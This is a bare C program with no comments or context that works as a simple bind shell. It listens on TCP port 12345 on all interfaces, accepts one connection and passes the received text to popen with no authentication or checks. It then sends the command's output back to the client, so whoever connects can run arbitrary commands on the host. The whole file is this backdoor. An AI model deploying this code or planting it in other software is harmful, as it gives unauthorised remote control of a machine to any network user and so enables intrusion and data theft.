#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_PORT 12345
#define BUFFER_SIZE 1024

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    int serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    socklen_t addrLen = sizeof(clientAddr);
    char command[BUFFER_SIZE], result[BUFFER_SIZE];

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        error("Error creating socket");
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        error("Error binding socket");
    }

    if (listen(serverSocket, 5) == -1) {
        error("Error listening for connections");
    }

    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrLen);
    if (clientSocket == -1) {
        error("Error accepting connection");
    }

    ssize_t bytesRead = recv(clientSocket, command, sizeof(command) - 1, 0);
    if (bytesRead == -1) {
        error("Error receiving command from client");
    } else if (bytesRead == 0) {
        printf("Client closed the connection\n");
    } else {
        command[bytesRead] = '\0'; 
        printf("Received command from client: %s\n", command);

        FILE *fp = popen(command, "r");
        if (fp == NULL) {
            error("Error executing command");
        }

        size_t bytesRead = fread(result, 1, sizeof(result) - 1, fp);

        if (send(clientSocket, result, bytesRead, 0) == -1) {
            error("Error sending results to client");
        }

        close(clientSocket);
        close(serverSocket);
        pclose(fp);
    }

    return 0;
}
